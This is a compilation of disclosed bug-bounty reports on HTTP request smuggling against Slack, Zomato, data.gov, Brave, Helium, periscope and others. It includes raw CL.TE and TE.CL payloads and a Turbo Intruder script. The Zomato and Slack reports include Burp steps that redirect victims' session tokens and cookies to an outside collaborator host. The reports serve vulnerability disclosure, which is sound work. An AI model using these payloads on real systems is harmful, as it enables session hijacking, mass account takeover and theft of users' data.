[Also, if you were able to find the piece of code responsible for this issue, please add a link to it in the source repository.]

## Impact: [add why this issue matters]
HTTP Request Smuggling can lead to web cache poisoning, session hijacking, cross site scripting, etc.

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, references, commits, code examples, etc.).

## Impact

HTTP Request Smuggling can lead to web cache poisoning, session hijacking, cross site scripting, etc.

---

### [http request smuggling in pscp.tv and periscope.tv](https://hackerone.com/reports/713285)

- **Report ID:** `713285`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** X / xAI
- **Reporter:** @protostar0
- **Bounty:** 560 usd
- **Disclosed:** 2020-09-10T22:52:57.208Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:** 
the Description of HTTP request smuggling attacks : [here](https://portswigger.net/web-security/request-smuggling)

seems that many subdomains in pscp.tv and periscope.tv vulenrable

##1-Detect HTTP request smuggling attack [504 response with delay (30 s, 60s)] "DoS"

POC & Steps To Reproduce: in this video F606648
Resource: [https://portswigger.net/web-security/request-smuggling/finding] 


##2- [exploit HTTP request smuggling attack ] send two request as one request get two response as one response [low impact]
POC & Steps To Reproduce & impact : in this video F606663
**ps:**
-add the two CRLFs in the end of the second request in GET REQUEST.
-use the valid value of content-length in POST REQUEST.

##3-[exploit HTTP request smuggling attack ]  poison the VICTIM request

POC & Steps To Reproduce & impact : in this video
inject a get request to the victim request F606689 
inject a get request to the victim request F606704 
**ps:**
-don't add the two CRLFs in the end of the second request in GET REQUEST.
-use large value in content-length then the length of request body in POST REQUEST.
Resource:
[exploit] (https://portswigger.net/web-security/request-smuggling/exploiting)

## important:
on a live site with a high volume of traffic like [www.pscp.tv] .it can be hard to prove request smuggling exists without exploiting numerous genuine users in the process.
-in the poc F606704  , i edit the victim request  to my post request `editing the description of my account` and ignore the real victim request. and the description  will change.

## Impact

1-dos
2-bypass csrf token & inject cookie  allow to link attacker account with [google,twitter] victim account
  report : https://hackerone.com/reports/704489
see other impact in 
https://portswigger.net/web-security/request-smuggling/exploiting

---

### [Stealing Zomato X-Access-Token: in Bulk using HTTP Request Smuggling on api.zomato.com](https://hackerone.com/reports/771666)

- **Report ID:** `771666`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Eternal
- **Reporter:** @defparam
- **Bounty:** - usd
- **Disclosed:** 2020-07-09T05:56:04.312Z
- **CVE(s):** -

**Vulnerability Information:**

# Intro
Hi Zomato Security Team!
My name is Evan Custodio and this is my first time evaluating your platform. I specialize in looking for server-side vulnerabilities. Recently I've taken a deep look at HTTP Request Smuggling issues. I have custom tools to evaluate over 150 types of HTTP Smuggling Payloads. When evaluating your platform I've found one asset that falls victim to HTTP Smuggling Attacks that result in: PII/Information Leakage, Session Takeover, Victim Request Hijacking/Forging and Forced Victim Redirection to Attacker Endpoint. this is a serious bug that should be dealt with immediately as any bad Actor could use these issues to stage attacks that could cause severe damage to Zomato and Zomato's Customers.

# api.zomato.com
## The Request Smuggling Bug
This asset is vulnerable several CL.TE-based HTTP Request Smuggling issues. This issue can cause data to poison the backend server socket and interfere with customer requests. One specific payload that cause issues are named in my tool as: "**tabprefix1**". This payload is a mutation of the "**Transfer-Encoding: chunked**" header that is placed in an HTTP request with "**Content-Length: (length)**" header. In the HTTP spec it is stated that when both Transfer-Encoding: chunked and Content-Length headers are specified then the server should always prioritize chunked encoding over Content-Length sizing. However, in cases when multiple reverse proxies are inline to an HTTP connection and a corner case TE and CL header are both specified, there are times when the frontend server may not recognize the TE header and fallback to CL processing while the backend server recognizes the TE header and prioritizes it over CL. When this happens it is considered HTTP De-synchronization which can lead to Request Smuggling (attacker data poisoning the backend socket into the victim connection).

Definition of **tabprefix1**:
- An HTTP request where both CL and TE headers are specified and where the TE header is formatted like so:
	- ``Transfer-Encoding:\tchunked`` (note that there is a tab after the colon and before the 'chunked', this disrupts the parsing)

This asset specifically shows issues with the **tabprefix1** test (see glimpse below)

{F680682}

If we focus on this specific attack payload,  here is what a typical hijack would look like:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 51
User-Agent: Treasure/6.7

0

GET /some/other/endpoint HTTP/1.1
X-Ignore: X[STOP]
```
If you look closely at the headers both Transfer-Encoding and Content-Length headers are specified in this payload. This hits a natural corner case in which Transfer-Encoding takes priority over the Content-Length, however if you look closely this payload places a tab character after the colon on the Transfer-Encoding line. By doing this the frontend server rejects that line and processes the whole request using the length of 51 found in the Content-Length header and forwards all 51 bytes of data to the backend server. The backend server sees the same HTTP request and processes the `Transfer-Encoding : chunked` as a normal chunked request. The issue is that the chucked request specifies 0 bytes of data and the remaining data of the 51 bytes is left on socket to poison the next customer request that comes into the backend server. Since this payload has no return characters after the "X-Ignore: X" then the poison data essentially pre-pends onto the customer request, their HTTP request line is deleted and the customer is redirected to `/some/other/endpoint`


# Bug #1 - Chain with an Open Redirect to Steal Session Tokens at Bulk
This bug is the big one that I believe is critical. As an attacker with Burp, one can craft a single Request Smuggling payload to steal a customer session token on Zomato. The following payload can be pasted into the repeater to illustrate this:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://2psvzm9pf3hkuz2dptyimjaynptfh4.burpcollaborator.net/desync/ HTTP/1.1
X: X
```
It appears when you smuggle and hijack an HTTP request and you change the request endpoint to be: `https://some.host.name/desync/` on the request line the backend server should never see a request like this because the frontend server immediately returns `404 Not Found`. However, if you smuggle it past the frontend server to the backend then the request is never filtered and it is responded to with a `301 Moved Permanently` to the location `http://some.host.name/desync`. When we do that to a victim connection the victim's HTTP client automatically redirects to the new location with the same exact headers (including and most importantly the `X-Access-Token:` header). In my test I set up a Burp Collaborator client with an address to force redirection to. The collaborator sees the DNS lookup and the HTTP Request with the  `X-Access-Token:` token. Futhermore I also receive the IP address of the victim.

Here is an example of me sending 1 smuggle/hijack to a victim in Burp Repeater:
█████

Here is the victim request showing up in my collaborator:
█████████

To illustrate impact, an attacker could write a script to scrape Access-Tokens this way, then with the access token grab the UserID via `GET /v2/tabbed/home HTTP/1.1`. Then with the Access-Token/UserID pair the attacker can access: `GET /v2/userdetails.json/<USERID> HTTP/1.1` to get the victim's First/Last Name, Phone Number, Email address, etc..

Also the attacker can perform full session takeover/impersonation by performing a normal login into zomato, intercept the response to his own `POST /v2/auth` request and swap his Access-Token/USERID with the victim's Access-Token/USERID. By doing this the mobile app will log onto zomato as if the attacker were the victim.

# Bug #1 - Triage
1) Open Burp and go into the Repeater tab
2) Click send and enter in the hostname/port/SSL (api.zomato.com 443 checked)
3) Click on menu Burp->Burp Collaborator client
4) In the Collaborator window set to Poll every 1 second and click on "Copy to clipboard", your collaborator URL should be in the clipboard, keep it saved
5) Back in the repeater paste the following as your request body:
```
DELETE / HTTP/1.1
Transfer-Encoding:	chunked
Host: api.zomato.com
Content-Length: 91
User-Agent: Treasure/6.7

0

GET https://**YOUR_COLLAB_URL**/desync/ HTTP/1.1
X: X
```
and replace YOUR_COLLAB_URL with the one copied from your collab client

6) Click send as many times required to see HTTP requests in your collab window.
**NOTE**: Sometimes you may just see DNS requests to your collaborator. Send the payload out as many times required to see an HTTP request.

# Conclusion
Thanks for your time reading my report and performing triage. I hope this writeup proves helpful! I have ceased my testing on `api.zomato.com` until remedy is in place. Once your team had remedy in place I will be happy to run my array of desync tests on the asset.

Thanks,
@defparam

## Impact

Attacker can achieve victim session takeover in bulk and steal all information from the victim. This attack can be automated to perform this process in bulk. Since this is the case I have filed this report as **Critical** because I believe it meets the criteria of:

`Information Disclosure - mass PII leaks including data such as names, phone numbers and addresses`

**Summary (researcher):**

Account takeover vulnerability using HTTP Request Smuggling and Desync attacks, this time through Akamai en route to Zomato. A big thanks to Zomato and Akamai for working with me to fix these issues in a timely manner.

For more information about these types of vulnerabilities check out my talk [Practical Attacks using HTTP Request Smuggling](https://youtu.be/3tpnuzFLU8g)

---

### [HTTP request Smuggling](https://hackerone.com/reports/867952)

- **Report ID:** `867952`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Helium
- **Reporter:** @dracomalfoy
- **Bounty:** - usd
- **Disclosed:** 2020-07-02T05:43:30.090Z
- **CVE(s):** -

**Vulnerability Information:**

When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

console.helium.com s vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

##Products affected:

Helium console Website. :  console.helium.com

##Steps To Reproduce:

1. Run the burp suite turbo intruder on the following request

```

POST /api/sessions HTTP/1.1
Host: console.helium.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://console.helium.com/login
Content-Type: application/json
Content-Length: 109
DNT: 1
Connection: close
Cookie: __cfduid=dc0212a0b1dcc0fe5853ef4e6b6d669ff1588840067; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6ImJmZDVjNzFmLWVhMWUtNDlmZi1hZGYyLTNlYWY3OTBjNmU3YlIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU4ODg0MDA3NzA2MiwibGFzdEV2ZW50VGltZSI6MTU4ODg0MTg5MDk3NiwiZXZlbnRJZCI6NywiaWRlbnRpZnlJZCI6Miwic2VxdWVuY2VOdW1iZXIiOjl9
Transfer-Encoding: chunked

39
{"session":{"email":"fdsfsd@fgd.jk","password":"sdfsdf"}}
00

GET / HTTP/1.1
Host: www.helium.com
foo: x


```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.

3. Observe 200 Ok response for the /api/sessions post request which is supposed to give  401 Unauthorized   {"errors":{"error":["The email address or password you entered is not valid"]}} Please refer the attached screenshot ( Smuggle Request1.png ) which contain the expected response. 

4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A recoding is attached as well.

Any suggestions or improvement in reports are welcome

## Impact

It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation and cache poisoning can be the impact of this vulnerability as well. Self-Xss can be escalated to XSS. It can be chained with other vulnerabilities to raise their severity.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.

For more information about the vulnerability please refer :
https://cwe.mitre.org/data/definitions/444.html ;
https://capec.mitre.org/data/definitions/33.html

---

### [HTTP Request Smuggling](https://hackerone.com/reports/866382)

- **Report ID:** `866382`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** Brave Software
- **Reporter:** @dracomalfoy
- **Bounty:** - usd
- **Disclosed:** 2020-06-04T00:52:31.476Z
- **CVE(s):** -

**Vulnerability Information:**

When malformed or abnormal HTTP requests are interpreted by one or more entities in the data flow between the user and the web server, such as a proxy or firewall, they can be interpreted inconsistently, allowing the attacker to "smuggle" a request to one device without the other device being aware of it. 

 publishers.basicattentiontoken.org is vulnerable to CL TE ( Front end server uses Content-Length , Back-end Server uses Transfer-encoding ) HTTP request smuggling attack.

## Products affected: 

Brave Website. : publishers.basicattentiontoken.org

## Steps To Reproduce:
1.  Run the burp suite turbo intruder on the following request

```
POST /publishers/registrations.json HTTP/1.1
Host: publishers.basicattentiontoken.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://publishers.basicattentiontoken.org/sign-up
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://publishers.basicattentiontoken.org
Content-Length: 136
DNT: 1
Connection: close
Transfer-encoding: chunked

35
{"terms_of_service":true,"email":"dhfs@kdjfksd.dfks"}
00

GET /assets/muli/Muli-Bold-ecdc1a24a0a56f42da0ee128d4c2e35235ef86acfbf98aab933aeb9cc5813bed.woff2 HTTP/1.1
Host: publishers.basicattentiontoken.org
foo: x


```

2. Script for tubro Intruder is attached. Word list can be any list containing any characters.
3. Observe 200 OK response for the /publishers/registrations.json post request which is supposed to give {"message":"Unverified request"}. Please refer the attached screenshot ( Smuggle Request1.png ) whih contain the expected response. 
4. This successfully confirms vulnerability.Please refer attached screenshot ( Final Response.png ). A seprate report is attached as well.


Any suggestions or improvement in reports are welcome as this is my first report.

## Impact

It is possible to smuggle the request and disrupt the user experience. Session Hijacking, Privilege Escalation  and cache poisoning can be the impact of this vulnerability as well.
As unauthenticated testing is performed the exact impact of the vulnerability cannot be predicted.

For more information about the vulnerability please refer :
 https://cwe.mitre.org/data/definitions/444.html ;
  https://capec.mitre.org/data/definitions/33.html

---

### [Request smuggling on admin-official.line.me could lead to account takeover](https://hackerone.com/reports/740037)

- **Report ID:** `740037`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** LY Corporation
- **Reporter:** @shaolin_tw
- **Bounty:** - usd
- **Disclosed:** 2020-05-19T12:47:09.957Z
- **CVE(s):** -

**Summary (team):**

The reporter identified a request smuggling issue on admin-official.line.me [(TE.CL-type).](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) The reporter clearly illustrated the impact without putting our users at risk or affecting the stability of our service. For this we would like to thank @shaolin_tw!

This issue was the result of how our load balancers were forwarding requests to the backend services. It had widespread influence and the report allowed us to resolve the issue internally, as well as make the vendor of the load balancers aware of this possible issue when using their product. The contents of the report allowed us to identify and prevent similar issues elsewhere in our infrastructure

---

### [HTTP Request Smuggling on https://labs.data.gov](https://hackerone.com/reports/726773)

- **Report ID:** `726773`
- **Severity:** High
- **Weakness:** HTTP Request Smuggling
- **Program:** GSA Bounty
- **Reporter:** @puppykok
- **Bounty:** 750 usd
- **Disclosed:** 2020-05-13T16:28:01.942Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings,

The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:

The purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.
```
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(14):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
The following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:
```
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
From the following screenshot, you can see that a 'victim' request was caught which redirected to a 404 page, just as intended, since `https://www.data.gov/hopefully404` does not actually exist. In addition, by searching for my Burp's collaborator URL, you can see that there are 67 instances where the URL is reflected, some within script tags and sources:
{F622456}

The following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:
``` 
-snip
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website","url":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/","name":"Data.gov","potentialAction":{"@type":"SearchAction","target":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}","query-input":"required name=search_term_string"}}]}</script>
<!-- / Yoast SEO plugin. -->

-snip-

<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4">

-snip-

<a class="dropdown-toggle local-link" data-toggle="dropdown" data-target="#" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/">Topics <b class="caret"></b></a>
<ul class="dropdown-menu topics">
	<li class="menu-agriculture topic-food"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/" class="local-link"><i></i><span>Agriculture</span></a></li>
	<li class="menu-climate topic-climate"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/" class="local-link"><i></i><span>Climate</span></a></li>
	<li class="menu-consumer topic-consumer"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/" class="local-link"><i></i><span>Consumer</span></a></li>
	<li class="menu-ecosystems topic-ecosystems"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/" class="local-link"><i></i><span>Ecosystems</span></a></li>
	<li class="menu-education topic-education"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/" class="local-link"><i></i><span>Education</span></a></li>
	<li class="menu-energy topic-energy"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/" class="local-link"><i></i><span>Energy</span></a></li>
	<li class="menu-finance topic-finance"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/" class="local-link"><i></i><span>Finance</span></a></li>
	<li class="menu-health topic-health"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/" class="local-link"><i></i><span>Health</span></a></li>
```
Note that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:
{F622459}
{F622460}
In order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.

## Impact

Since the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).

---

### [Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies](https://hackerone.com/reports/737140)

- **Report ID:** `737140`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Slack
- **Reporter:** @defparam
- **Bounty:** - usd
- **Disclosed:** 2020-03-12T00:29:01.426Z
- **CVE(s):** -

**Vulnerability Information:**

Hi Slack Security Team!

My name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.

The bug chain is as follows:
1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on `slackb.com`
2) Request Hijack forces victim HTTP requests to instead use `GET https://<URL> HTTP/1.1` on `slackb.com`
3) A request of `GET https://<URL> HTTP/1.1` on the backend server socket results in a 301 redirect to `https://<URL>` with slack cookies (most importantly the `d` cookie)
4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack
5) Me (if I were evil) collects massive amounts of `d` session cookies and steals any/all possble Slack user/organization data from victim sessions

So let's start from the beginning. I was running `smuggler -u https://slackb.com` running my array of exhaustive tests when I stumbled upon a failure with test: `space1` (see below)

{F633736}

The `space1` tests checks for HTTP desync with the following payload:

{F633737}

This testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the `Transfer-Encoding: chunked` header (specified in some abnormal way) and the `Content-Length: ` header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using `Content-Length` and the backend server interprets the request using the `Transfer-Encoding: chunked` method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The `space1` payload places a space character in between `Transfer-Encoding` and the colon `:`. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.

One popular attack with a CLTE is to prepend data to the next request that would "erase" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the `slackb.com` attack. The best way I can explain it is through Visio using these diagrams (see below)

{F633741}

Explanation of the malicious request:

{F633743}

Here are your steps to triage:
1) Open up a fresh Burp
2) Open up a fresh Collaborator by going to menu: `Burp->Burp Collaborator Client`
3) In the Collaborator Client click on `Copy to clipboard` for the server URL
4) Go to the Repeater tab
5) Add the following payload and replace <URL> with your collaborator URL
```
GET / HTTP/1.1
Transfer-Encoding : chunked
Host: slackb.com
User-Agent: Smuggler/v1.0
Content-Length: 83

0

GET <URL> HTTP/1.1
X: X
```
6) Set the repeater target to: `host: slackb.com , Port: 443 (SSL)`  by double clicking on target
7) Press go
8) In the Collaborator window click `Poll now` until you see requests

The attack should roughly look like this:
Burp Repeater:
{F633745}

Collaborator DNS request: (The Victim's IP Address is leaked too!)
{F633746}

The special cookie stolen from this attack:
{F633749}

At this point you just attacked an arbitrary slack customer and have access to her `d` session cookie.
From here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.

I'm happy to help if you have any further questions. Most of my requests have been made using the `User-Agent: Smuggler/v1.0` header, feel free to review traffic logs keying off that.

Have a nice day!
Best,
Evan

## Impact

So it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach. 

I am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.

Best Wishes,
Evan

**Summary (researcher):**

This researcher exploited an HTTP Request Smuggling bug on a Slack asset to perform a CL.TE-based hijack onto neighboring customer requests. This hijack forced the victim into an open-redirect that forwarded the victim onto the researcher's collaborator client with slack domain cookies. The posted cookies in the customer request on the collaborator client contained the customer's secret session cookie. With this attack the researcher was able to prove session takeover against arbitrary slack customers.

---

### [HTTP request smuggling using malformed Transfer-Encoding header](https://hackerone.com/reports/735748)

- **Report ID:** `735748`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Node.js
- **Reporter:** @erubinson
- **Bounty:** - usd
- **Disclosed:** 2020-03-07T19:33:58.458Z
- **CVE(s):** CVE-2019-15605

**Vulnerability Information:**

Please see the attached PDF for a writeup of this vulnerability.

## Impact

Please see the attached PDF for a writeup of this vulnerability.

---

### [Multiple HTTP Smuggling reports](https://hackerone.com/reports/648434)

- **Report ID:** `648434`
- **Severity:** Critical
- **Weakness:** HTTP Request Smuggling
- **Program:** Internet Bug Bounty
- **Reporter:** @regilero
- **Bounty:** - usd
- **Disclosed:** 2019-11-12T23:44:23.458Z
- **CVE(s):** CVE-2017-7658, CVE-2018-8004, CVE-2017-7656, CVE-2017-7657, CVE-2016-8743, CVE-2015-3183, CVE-2016-10711, CVE-2016-2086, CVE-2016-2216, CVE-2016-6816, CVE-2015-8852, CVE-2015-5739, CVE-2015-5740

**Vulnerability Information:**

Theses reports spreads other several years and are all about **HTTP Smuggling issues**
(HTTP Requests or Responses splitting, Cache Poisoning, Security filter bypass).
I've made reports on a wide range of open source projects, explaining
the (not always easy) problems to the various security maintainers and testing the fixs.

The starting point for this work was the 2005 work published by Amit Klein and some others:

 * 2004 - Amit Klein : "Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics" https://packetstormsecurity.com/papers/general/whitepaper_httpresponse.pdf
 * 2005 - Chaim Linhart, Amit Klein, Ronen Heled, Steve Orrin: "HTTP Request Smuggling" https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
 * 2006 - Amit Klein: "HTTP Message Splitting, Smuggling and Other Animals" www.owasp.org/images/1/1a/OWASPAppSecEU2006_HTTPMessageSplittingSmugglingEtc.ppt 
 * 2005 - Amit Klein: "HTTP Request Smuggling - ERRATA (the IIS 48K buffer phenomenon)" 
 * 2006 - Amit Klein: “HTTP Response Smuggling” https://www.securityfocus.com/archive/1/425593
 * 2006 - Amit Klein : HTTP Response Smuggling http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2006-February/000836.html
 * RFC 7230 section 9 (splitting, parsing, smuggling, poisoning) https://tools.ietf.org/html/rfc7230#section-9

And also the works of James Kettle on HTTP Host headers "Practical HTTP Host header attacks (Absolute uri in host headers)"
https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
and, later, his work on ESI server or pingbacks and cache attacks or Pratical Web Cache Poisoning.

In 2015, Starting from these past studies, I studied **Apache**, **Nginx**, **Varnish** source code, I discovered
that a lot of smuggling problems were still present, found new ones based on overflows for the size
attributes (previous works were mostly based on doubling length information) and expanded my works on
**Golang**, **Nodejs**, **pound**, **HaProxy**, **Jetty**, **Tomcat**, **Apache Traffic Server**...

I sometime had to push for disclosure of fixed vulnerabilitie (Varnish 3) via bugtraq.
But in most of the case it's been a matter a patience -- the long time between reports and fixes
ha also something to deal with lazyness on my side as security is not the biggest part of my job --
as most of the fix implies updates on HTTP servers, which is not something as fast as updating a web
application framework. I did not get a security report or a CVE for each reported flaw, especially
on the first years. Smuggling is sometimes hard to explain (and public disclosure policies
are not always liked on HTTP servers dev teams).

The main problem of HTTP smuggling issues is that the final exploitation comes from **interactions between different http parsers**. If two actors badly interprets the HTTP message or disagree on the right
interpretation then bad things could happen. From the security maintainer point of view it's sometimes
easy to reject the problem as coming from the others.

It's also **very important** to understand that the attacker controls the HTTP message, **we do not use HTTP messages from browsers**, the attacker injects bad HTTP messages onto servers infrastructures, effects on the users comes later, when the real user HTTP messages reach the *infected* or  *shaken* servers. *Like when you do report a smuggling issue on hackerone reports, they prevent reporters that issues about header injection are not always security issues because we cannot control the user headers. That's a huge misunderstanding of smuggling payloads*.

I've made some blog posts explaining details (I still have one awaiting vendor authorization) for some
of the fixed problems.

And I also made a **Defcon 24** presentation on 2016. For someone knowing nothing on smuggling
it's a good starting point (links on next part below).

Note : my work is usually reported with the name 'regilero', and sometimes 'Régis Leroy'.

# Public ressources published

 * 2015 : Nginx Integer truncation : https://regilero.github.io/english/security/2015/03/25/nginx-integer_truncation/
 * 2015 : Checking HTTP Smuggling issues in 2015 – Part1 http://regilero.github.io/security/english/2015/10/04/http_smuggling_in_2015_part_one 
 * 2016 : Defcon 24 : Hiding Wookiees in HTTP: HTTP smuggling https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf
    - Defcon presentation : https://www.youtube.com/watch?v=dVU9i5PsMPY
    - Defcon demos : https://www.youtube.com/watch?v=lY_Mf2Fv7kI  (which were not available on time due to Linux not supported by Defcon !!)
 * 2018 : HTTP Smuggling, Apsis Pound load balancer : https://regilero.github.io/english/security/2018/07/03/security_pound_http_smuggling/
 * 2019 : HTTP Smuggling, Jetty : https://regilero.github.io/english/security/2019/04/24/security_jetty_http_smuggling/
 
Tools: HTTPWookiee : https://github.com/regilero/HTTPWookiee : this contains a small subset of the real tests I perform on HTTP servers.

# List of CVEs

## Apache Traffic Server

 * **CVE-2018-8004** : space before colon + force connection close on error 400 + duplicate Content-Lenght issues + bad parsing of request size on cache hit

## Jetty

 * **CVE-2017-7656** : HTTP/0.9 Request Smuggling
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7656 (score 6.5)

 * **CVE-2017-7657**: Transfer-Encoding Request Smuggling
  https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7657 (score 6.5)

